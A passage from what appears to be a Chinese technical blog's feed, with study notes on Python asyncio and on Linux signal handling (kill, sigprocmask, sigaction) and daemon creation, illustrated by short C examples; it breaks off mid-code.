print(<span class="string">"start ..."</span>)</span><br><span class="line">    <span class="keyword">await</span> asyncio.sleep(<span class="number">5</span>-i)</span><br><span class="line">    print(<span class="string">"end ..."</span>)</span><br><span class="line">    <span class="keyword">return</span> i,<span class="number">123</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    task_l = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">        task = asyncio.ensure_future(func(i))</span><br><span class="line">        task_l.append(task)</span><br><span class="line">    <span class="keyword">for</span> ret <span class="keyword">in</span> asyncio.as_completed(task_l):</span><br><span class="line">        res = <span class="keyword">await</span> ret</span><br><span class="line">        print(res)</span><br><span class="line"></span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">loop.run_until_complete(main())</span><br></pre></td></tr></table></figure><p>这里我们起5个协程，使用<code>ensure_future</code>安排将要执行的协程任务，并将5个协程保存在列表中，使用<code>as_completed</code>方法可以随时获取任务的返回值，不需要等待循环事件结束后一并获取所有任务的返回值，随后使用<code>await</code>等待任务完成。因为我们是按顺序来获取返回值，因此睡眠时间最短的应该最先返回，对于5次循环，当<code>i=4</code>的时候只需要睡眠1秒，因此我们应该先得到的返回值是<code>(4,123)</code>，最终得到的输出如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">start ...</span><br><span class="line">start ...</span><br><span class="line">start ...</span><br><span class="line">start ...</span><br><span class="line">start ...</span><br><span class="line">end ...</span><br><span class="line">(4, 123)</span><br><span class="line">end ...</span><br><span class="line">(3, 123)</span><br><span class="line">end ...</span><br><span class="line">(2, 123)</span><br><span class="line">end ...</span><br><span class="line">(1, 123)</span><br><span class="line">end ...</span><br><span class="line">(0, 123)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;协程概念&quot;&gt;&lt;a href=&quot;#协程概念&quot; class=&quot;headerlink&quot; title=&quot;协程概念&quot;&gt;&lt;/a&gt;协程概念&lt;/h4&gt;&lt;p&gt;协程是一种用户态的轻量级线程，协程的调度完全由用户控制。协程拥有自己的寄存器上下文和栈。协程调度切换时，将寄存器上下文和栈保
      
    
    </summary>
    
    
      <category term="学习笔记" scheme="elssm.github.io/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>Linux系统编程(三)</title>
    <link href="elssm.github.io/2021/10/20/Linux%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B-%E4%B8%89/"/>
    <id>elssm.github.io/2021/10/20/Linux系统编程-三/</id>
    <published>2021-10-20T03:21:41.000Z</published>
    <updated>2021-10-29T04:55:20.244Z</updated>
    
    <content type="html"><![CDATA[<h4 id="信号"><a href="#信号" class="headerlink" title="信号"></a>信号</h4><h5 id="信号概念"><a href="#信号概念" class="headerlink" title="信号概念"></a>信号概念</h5><p>信号是信息的载体，Linux/UNIX环境下，古老、经典的通信方式，现下依然是主要的通信手段。</p><p>Unix早期版本就提供了信号机制，但不可靠，信号可能丢失，Berkeley和AT&amp;T都对信号模型做了更改，增加了可靠信号机制，但彼此不兼容。POSIX.1对可靠信号例程进行了标准化。</p><ul><li>未决：产生与递达之间状态</li><li>递达：产生并且送达到进程，直接被内核处理掉</li><li>信号处理方式：执行默认处理动作、忽略、捕捉</li><li>阻塞信号集(信号屏蔽字)：本质是位图，用来记录信号的屏蔽状态，一旦被屏蔽的信号，在解除屏蔽前，一直处于未决状态</li><li>未决信号集：本质也是位图，用来记录信号的处理状态，该信号集中的信号，表示已经产生，但尚未被处理。</li></ul><h5 id="信号特质"><a href="#信号特质" class="headerlink" title="信号特质"></a>信号特质</h5><p>由于信号是通过软件方法实现，其实现手段导致信号有很强的延时性，但对于用户来说，这个延迟时间非常短，不易察觉。<strong>每个进程收到的所有信号，都是由内核负责发送的，内核处理。</strong></p><h5 id="产生信号"><a href="#产生信号" class="headerlink" title="产生信号"></a>产生信号</h5><ul><li>按键产生：<code>Ctrl+c</code>、<code>Ctrl+z</code>、<code>Ctrl+\</code></li><li><p>系统调用产生：<code>kill、raise、abort</code></p></li><li><p>软件条件产生：定时器<code>alarm</code></p></li><li>硬件异常产生：非法访问内存、除0、内存对齐错误</li><li>命令产生：<code>kill</code>命令</li></ul><h5 id="信号4要素"><a href="#信号4要素" class="headerlink" title="信号4要素"></a>信号4要素</h5><p>和变量三要素类似，每个信号也有其必备四要素，分别是编号、名称、事件和默认处理动作，如下图所示</p><p><img src="/2021/10/20/Linux系统编程-三/1.png" alt="1"></p><h5 id="kill函数"><a href="#kill函数" class="headerlink" title="kill函数"></a>kill函数</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">kill</span><span class="params">(<span class="keyword">pid_t</span> pid,<span class="keyword">int</span> sig)</span></span></span><br><span class="line"><span class="function">  </span></span><br><span class="line">成功：0</span><br><span class="line">失败：<span class="number">-1</span> 设置errno</span><br><span class="line"></span><br><span class="line">pid&gt;<span class="number">0</span> : 发送信号给指定的进程</span><br><span class="line">pid=<span class="number">0</span> : 发送信号给与调用kill函数进程属于同一进程组的所有进程</span><br><span class="line">pid&lt;<span class="number">-1</span> : 取|pid|发给对应进程组</span><br><span class="line">pid=<span class="number">-1</span> : 发送给进程有权限发送的系统中的所有进程</span><br></pre></td></tr></table></figure><h5 id="通过子进程发信号的方式kill进程"><a href="#通过子进程发信号的方式kill进程" class="headerlink" title="通过子进程发信号的方式kill进程"></a>通过子进程发信号的方式kill进程</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sys_err</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *str)</span></span>&#123;</span><br><span class="line">    perror(str);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">pid_t</span> pid = fork();</span><br><span class="line">  <span class="keyword">if</span>(pid&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"parent,pid = %d\n"</span>,getpid());</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(pid == <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"child pid = %d,ppid = %d\n"</span>,getpid(),getppid());</span><br><span class="line">    sleep(<span class="number">2</span>);</span><br><span class="line">    kill(getppid(),SIGKILL);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="信号集操作函数"><a href="#信号集操作函数" class="headerlink" title="信号集操作函数"></a>信号集操作函数</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">sigset_t</span> <span class="built_in">set</span> 自定义信号集</span><br><span class="line">sigemptyset(<span class="keyword">sigset_t</span> *<span class="built_in">set</span>) 清空信号集</span><br><span class="line">sigfillset(<span class="keyword">sigset_t</span> *<span class="built_in">set</span>) 全部置<span class="number">1</span></span><br><span class="line">sigaddset(<span class="keyword">sigset_t</span> *<span class="built_in">set</span>,<span class="keyword">int</span> signum) 将一个信号添加到集合中</span><br><span class="line">sigdelset(<span class="keyword">sigset_t</span> *<span class="built_in">set</span>,<span class="keyword">int</span> signum) 将一个信号从集合中移除</span><br><span class="line">sigismember(<span class="keyword">const</span> <span class="keyword">sigset_t</span> *<span class="built_in">set</span>,<span class="keyword">int</span> signum) 判断一个信号是否在集合中</span><br></pre></td></tr></table></figure><h5 id="设置信号屏蔽字和解除屏蔽"><a href="#设置信号屏蔽字和解除屏蔽" class="headerlink" title="设置信号屏蔽字和解除屏蔽"></a>设置信号屏蔽字和解除屏蔽</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sigprocmask</span><span class="params">(<span class="keyword">int</span> how,<span class="keyword">const</span> <span class="keyword">sigset_t</span> *<span class="built_in">set</span>,<span class="keyword">sigset_t</span> *oldset)</span></span></span><br><span class="line"><span class="function">  </span></span><br><span class="line">  how:SIG_BLOCK 设置阻塞</span><br><span class="line">      SIG_UNBLOCK 取消阻塞</span><br><span class="line">      SIG_SETMASK 用自定义<span class="built_in">set</span>替换ask</span><br><span class="line">  <span class="built_in">set</span>:自定义<span class="built_in">set</span></span><br><span class="line">  oldset:旧有的mask</span><br></pre></td></tr></table></figure><h5 id="查看未决信号集"><a href="#查看未决信号集" class="headerlink" title="查看未决信号集"></a>查看未决信号集</h5><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sigpending</span><span class="params">(<span class="keyword">sigset_t</span> *<span class="built_in">set</span>)</span></span></span><br><span class="line"><span class="function">  </span></span><br><span class="line">  set:传出的未决信号集</span><br></pre></td></tr></table></figure><h5 id="屏蔽SIGINT信号"><a href="#屏蔽SIGINT信号" class="headerlink" title="屏蔽SIGINT信号"></a>屏蔽SIGINT信号</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sys_err</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *str)</span></span>&#123;</span><br><span class="line">perror(str);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_set</span><span class="params">(<span class="keyword">sigset_t</span> *<span class="built_in">set</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">1</span>;i&lt;<span class="number">32</span>;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(sigismember(<span class="built_in">set</span>,i))</span><br><span class="line"><span class="built_in">putchar</span>(<span class="string">'1'</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">putchar</span>(<span class="string">'0'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">sigset_t</span> <span class="built_in">set</span>,oldset,pedset;</span><br><span class="line"><span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">sigemptyset(&amp;<span class="built_in">set</span>);</span><br><span class="line">sigaddset(&amp;<span class="built_in">set</span>,SIGINT);</span><br><span class="line"></span><br><span class="line">ret = sigprocmask(SIG_BLOCK,&amp;<span class="built_in">set</span>,&amp;oldset);</span><br><span class="line"><span class="keyword">if</span>(ret == <span class="number">-1</span>)</span><br><span class="line">sys_err(<span class="string">"sigprocmask error"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">ret = sigpending(&amp;pedset);</span><br><span class="line">print_set(&amp;pedset);</span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="信号捕捉"><a href="#信号捕捉" class="headerlink" title="信号捕捉"></a>信号捕捉</h4><h5 id="signal函数"><a href="#signal函数" class="headerlink" title="signal函数"></a>signal函数</h5><p>注册一个信号捕捉函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span><span class="params">(*<span class="keyword">sighandler_t</span>)</span><span class="params">(<span class="keyword">int</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">sighandler_t</span> <span class="title">signal</span><span class="params">(<span class="keyword">int</span> signum,<span class="keyword">sighandler_t</span> handler)</span></span>;</span><br></pre></td></tr></table></figure><h5 id="使用signal函数捕捉SIGINT信号"><a href="#使用signal函数捕捉SIGINT信号" class="headerlink" title="使用signal函数捕捉SIGINT信号"></a>使用signal函数捕捉SIGINT信号</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sys_err</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *str)</span></span>&#123;</span><br><span class="line">perror(str);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sig_catch</span><span class="params">(<span class="keyword">int</span> signo)</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"catch you!! %d\n"</span>,signo);</span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">signal(SIGINT,sig_catch);</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="sigaction函数"><a href="#sigaction函数" class="headerlink" title="sigaction函数"></a>sigaction函数</h5><p>修改信号处理动作(通常在Linux用其来注册一个信号的捕捉函数)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sigaction</span><span class="params">(<span class="keyword">int</span> signum,<span class="keyword">const</span> struct sigaction *act,struct sigaction *oldact)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line">成功：0</span><br><span class="line">失败：<span class="number">-1</span> 设置errno</span><br><span class="line">  </span><br><span class="line">参数</span><br><span class="line">  act: 传入参数，新的处理方式</span><br><span class="line">  oldact: 传出参数，旧的处理方式</span><br></pre></td></tr></table></figure><p>struct sigaction 结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigaction</span> &#123;</span></span><br><span class="line">  <span class="keyword">void</span> (*sa_handler)(<span class="keyword">int</span>); <span class="comment">//指定信号捕捉后的处理函数名</span></span><br><span class="line">  <span class="keyword">void</span> (*sa_sigaction)(<span class="keyword">int</span>,<span class="keyword">siginfo_t</span>*,<span class="keyword">void</span>*);</span><br><span class="line">  <span class="keyword">sigset_t</span> samask; <span class="comment">//调用信号处理函数时，所要屏蔽的信号集合</span></span><br><span class="line">  <span class="keyword">int</span> sa_flags; <span class="comment">//通常设置为0 表示默认属性</span></span><br><span class="line">  <span class="keyword">void</span> (*sa_restorer)(<span class="keyword">void</span>);   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="使用sigaction函数捕捉SIGINT信号"><a href="#使用sigaction函数捕捉SIGINT信号" class="headerlink" title="使用sigaction函数捕捉SIGINT信号"></a>使用sigaction函数捕捉SIGINT信号</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sys_err</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *str)</span></span>&#123;</span><br><span class="line">perror(str);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sig_catch</span><span class="params">(<span class="keyword">int</span> signo)</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"catch you!! %d\n"</span>,signo);</span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigaction</span> <span class="title">act</span>,<span class="title">oldact</span>;</span></span><br><span class="line">act.sa_handler = sig_catch; <span class="comment">//set callback function name</span></span><br><span class="line">sigemptyset(&amp;(act.sa_mask)); <span class="comment">//set mask when sig_catch working</span></span><br><span class="line">act.sa_flags = <span class="number">0</span>; <span class="comment">//usually use</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> ret = sigaction(SIGINT,&amp;act,&amp;oldact); <span class="comment">//注册信号捕捉函数</span></span><br><span class="line"><span class="keyword">if</span>(ret == <span class="number">-1</span>)</span><br><span class="line">sys_err(<span class="string">"sigaction error"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="守护进程"><a href="#守护进程" class="headerlink" title="守护进程"></a>守护进程</h4><p>Daemon是Linux中的后台服务进程，通常独立于控制终端并且周期性地执行某种任务或等待处理某些发生的时间，一般采用以d结尾的名字。Linux后台的一些系统服务进程，没有控制终端，不能直接和用户交互，不受用户登陆、注销的影响，一直在运行着，他们都是守护进程。如，预读入缓输出机制的实现，FTP服务器，nfs服务器等。创建守护进程，最关键的一步是调用setsid函数创建一个新的Session，并成为Session Leader</p><h5 id="创建守护进程模型"><a href="#创建守护进程模型" class="headerlink" title="创建守护进程模型"></a>创建守护进程模型</h5><ul><li><p>创建子进程，父进程推出</p><p>所有工作在子进程中进行形式上脱离了控制终端</p></li><li><p>在子进程中创建新会话</p><p><code>setsid()</code>函数</p><p>使子进程完全独立出来，脱离控制</p></li><li><p>改变当前目录为根目录</p><p><code>chdir()</code>函数</p><p>防止占用可卸载的文件系统(U盘等)</p><p>也可以换成其他路径</p></li><li><p>重设文件权限掩码</p><p><code>umask()</code>函数</p><p>防止继承的文件创建屏蔽字拒绝某些权限</p><p>增加守护进程灵活性</p></li><li><p>关闭文件描述符(0,1,2)</p><p>继承的打开文件不会用到，浪费系统资源，无法卸载</p></li></ul><h5 id="创建守护进程代码"><a href="#创建守护进程代码" class="headerlink" title="创建守护进程代码"></a>创建守护进程代码</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sys_err</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *str)</span></span>&#123;</span><br><span class="line">perror(str);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">pid_t</span> pid;</span><br><span class="line"><span class="keyword">int</span> ret,fd;</span><br><span class="line">pid = fork();</span><br><span class="line"><span class="keyword">if</span>(pid&gt;<span class="number">0</span>)</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>); <span class="comment">//父进程终止</span></span><br><span class="line"></span><br><span class="line">pid = setsid();  <span class="comment">//创建新会话</span></span><br><span class="line"><span class="keyword">if</span>(pid == <span class="number">-1</span>)</span><br><span class="line">sys_err(<span class="string">"setsid error"</span>);</span><br><span class="line">ret = chdir(<span class="string">"/Users/caoyifan/Desktop/test"</span>); <span class="comment">//改变工作目录位置</span></span><br><span class="line"><span class="keyword">if</span>(ret == <span class="number">-1</span>)</span><br><span class="line">sys_err(<span class="string">"chdir error"</span>);</span><br><span class="line">umask(<span class="number">0022</span>); <span class="comment">//改变文件访问权限掩码</span></span><br><span class="line">close(STDIN_FILENO); <span class="comment">//关闭文件描述符0</span></span><br><span class="line">fd = open(<span class="string">"/dev/null"</span>,O_RDWR); <span class="comment">// fd=0</span></span><br><span class="line"><span class="keyword">if</span>(fd == <span class="number">-1</span>)</span><br><span class="line">sys_err(<span class="string">"open error"</span>);</span><br><span class="line">dup2(fd,STDOUT_FILENO); <span class="comment">//重定向stdout和stderr</span></span><br><span 